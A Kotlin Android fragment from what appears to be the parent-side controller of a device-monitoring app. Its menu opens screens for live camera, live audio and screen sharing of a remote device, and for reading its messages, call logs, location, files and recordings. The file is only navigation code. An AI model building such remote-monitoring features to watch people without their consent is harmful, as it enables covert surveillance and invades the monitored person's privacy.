package com.bannigaurd.parent

import android.graphics.Color
import android.os.Bundle
import android.view.LayoutInflater
import android.view.View
import android.view.ViewGroup
import android.widget.ImageView
import android.widget.TextView
import android.widget.Toast
import androidx.appcompat.content.res.AppCompatResources
import androidx.fragment.app.Fragment
import androidx.recyclerview.widget.GridLayoutManager
import androidx.recyclerview.widget.RecyclerView

// --- Data class for a feature item ---
data class FeatureItem(val name: String, val iconRes: Int)

// --- Adapter for the features grid ---
class FeaturesAdapter(
    private val features: List<FeatureItem>,
    private val onItemClick: (FeatureItem) -> Unit
) : RecyclerView.Adapter<FeaturesAdapter.FeatureViewHolder>() {

    class FeatureViewHolder(itemView: View) : RecyclerView.ViewHolder(itemView) {
        private val icon: ImageView = itemView.findViewById(R.id.ivFeatureIcon)
        private val name: TextView = itemView.findViewById(R.id.tvFeatureName)

        fun bind(feature: FeatureItem) {
            icon.setImageResource(feature.iconRes)
            name.text = feature.name
        }
    }

    override fun onCreateViewHolder(parent: ViewGroup, viewType: Int): FeatureViewHolder {
        val view = LayoutInflater.from(parent.context)
            .inflate(R.layout.feature_button_standard, parent, false)
        return FeatureViewHolder(view)
    }

    override fun onBindViewHolder(holder: FeatureViewHolder, position: Int) {
        val feature = features[position]
        holder.bind(feature)
        holder.itemView.setOnClickListener {
            onItemClick(feature)
        }
    }

    override fun getItemCount() = features.size
}


// --- The main fragment ---
class FeaturesFragment : Fragment() {

    private var deviceId: String? = null

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        arguments?.let {
            deviceId = it.getString("DEVICE_ID")
        }
    }

    override fun onCreateView(
        inflater: LayoutInflater, container: ViewGroup?,
        savedInstanceState: Bundle?
    ): View? {
        val view = inflater.inflate(R.layout.fragment_features, container, false)

        val btnScreenShare = view.findViewById<View>(R.id.btnScreenShare)
        val btnLiveCamera = view.findViewById<View>(R.id.btnLiveCamera)
        val btnLiveAudio = view.findViewById<View>(R.id.btnLiveAudio)

        setupVipButton(btnScreenShare, "Screen Share", R.drawable.ic_screen_share, "#2196F3")
        setupVipButton(btnLiveCamera, "Live Camera", R.drawable.ic_live_camera, "#F44336")
        setupVipButton(btnLiveAudio, "Live Audio", R.drawable.ic_live_audio, "#9C27B0")

        // --- VIP बटनों के लिए Click Listeners ---

        btnLiveAudio.setOnClickListener {
            if (deviceId != null) {
                openFragment(LiveAudioFragment.newInstance(deviceId!!))
            } else {
                Toast.makeText(requireContext(), "Please select a device first.", Toast.LENGTH_SHORT).show()
            }
        }

        btnLiveCamera.setOnClickListener {
            if (deviceId != null) {
                openFragment(CameraStreamFragment.newInstance(deviceId!!))
            } else {
                Toast.makeText(requireContext(), "Please select a device first.", Toast.LENGTH_SHORT).show()
            }
        }

        btnScreenShare.setOnClickListener {
            if (deviceId != null) {
                openFragment(ScreenShareFragment.newInstance(deviceId!!))
            } else {
                Toast.makeText(requireContext(), "Please select a device first.", Toast.LENGTH_SHORT).show()
            }
        }


        val recyclerView = view.findViewById<RecyclerView>(R.id.rvStandardFeatures)
        recyclerView.layoutManager = GridLayoutManager(context, 3)

        recyclerView.adapter = FeaturesAdapter(getStandardFeatures()) { featureItem ->
            when (featureItem.name) {
                "Call Logs" -> openFragment(CallLogFragment())
                "Contacts" -> openFragment(ContactsFragment())
                "Messages" -> openFragment(ConversationsFragment())
                "Gallery" -> openFragment(GalleryFragment())
                // --- FIX: FilesFragment को बुलाने का तरीका बदला गया ---
                "Files" -> {
                    openFragment(FilesFragment())
                }
                "Notifications" -> openFragment(NotificationsFragment())
                "Apps" -> openFragment(AppsFragment())
                "Location" -> openFragment(LocationFragment())
                "Usage" -> openFragment(UsageFragment())
                "Utilities" -> openFragment(UtilitiesFragment())
                "Recordings" -> {
                    if (deviceId != null) {
                        openFragment(RecordingsFragment.newInstance(deviceId!!))
                    } else {
                        Toast.makeText(requireContext(), "Device ID not found!", Toast.LENGTH_SHORT).show()
                    }
                }
                "Saved Files" -> openFragment(SavedFilesFragment())
            }
        }
        return view
    }

    private fun openFragment(fragment: Fragment) {
        parentFragmentManager.beginTransaction()
            .replace(R.id.fragment_container, fragment)
            .addToBackStack(null)
            .commit()
    }

    private fun setupVipButton(view: View, name: String, iconRes: Int, colorHex: String) {
        val icon = view.findViewById<ImageView>(R.id.ivFeatureIcon)
        val text = view.findViewById<TextView>(R.id.tvFeatureName)

        icon.setImageDrawable(AppCompatResources.getDrawable(requireContext(), iconRes))
        icon.setColorFilter(Color.parseColor(colorHex))
        text.text = name
    }

    private fun getStandardFeatures(): List<FeatureItem> {
        return listOf(
            FeatureItem("Call Logs", R.drawable.ic_call_logs),
            FeatureItem("Contacts", R.drawable.ic_contacts),
            FeatureItem("Utilities", R.drawable.ic_utilities),
            FeatureItem("Usage", R.drawable.ic_usage),
            FeatureItem("Messages", R.drawable.ic_messages),
            FeatureItem("Gallery", R.drawable.ic_gallery),
            FeatureItem("Files", R.drawable.ic_files),
            FeatureItem("Location", R.drawable.ic_location),
            FeatureItem("Saved Files", R.drawable.ic_saved_files),
            FeatureItem("Notifications", R.drawable.ic_notifications),
            FeatureItem("Recordings", R.drawable.ic_recordings),
            FeatureItem("Apps", R.drawable.ic_apps)
        )
    }
}